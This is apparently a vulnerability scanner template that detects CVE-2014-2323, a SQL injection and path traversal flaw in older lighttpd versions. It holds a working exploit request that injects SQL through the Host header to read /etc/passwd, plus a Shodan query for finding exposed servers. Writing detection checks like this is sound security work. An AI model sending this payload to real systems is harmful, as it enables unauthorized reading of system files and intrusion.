id: CVE-2014-2323

info:
  name: Lighttpd 1.4.34 SQL Injection and Path Traversal
  author: geeknik
  severity: critical
  description: A SQL injection vulnerability in mod_mysql_vhost.c in lighttpd before 1.4.35 allows remote attackers to execute arbitrary SQL commands via the host name (related to request_check_hostname).
  impact: |
    Successful exploitation of these vulnerabilities could lead to unauthorized access to sensitive data and remote code execution
  remediation: |
    Upgrade to a patched version of Lighttpd or apply the necessary security patches
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2014-2323
    - https://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt
    - http://www.lighttpd.net/2014/3/12/1.4.35/
    - http://seclists.org/oss-sec/2014/q1/561
    - http://jvn.jp/en/jp/JVN37417423/index.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2014-2323
    cwe-id: CWE-89
    epss-score: 0.92388
    epss-percentile: 0.99713
    cpe: cpe:2.3:a:lighttpd:lighttpd:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: lighttpd
    product: lighttpd
    shodan-query: cpe:"cpe:2.3:a:lighttpd:lighttpd"
  tags: cve2014,cve,lighttpd,injection,seclists,sqli,vuln

http:
  - raw:
      - |+
        GET /etc/passwd HTTP/1.1
        Host: [::1]' UNION SELECT '/

    unsafe: true
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
# digest: 490a00463044022074b62136edfb1b53cd25d2c3c23a718dc4dca23d9c06c75a20be9c47e3d18f4e02200dfcb4c7272c146c85e7696f91bc58ccf1f828491f130d97e24710b978ec93eb:922c64590222798bb761d5b6d8e72950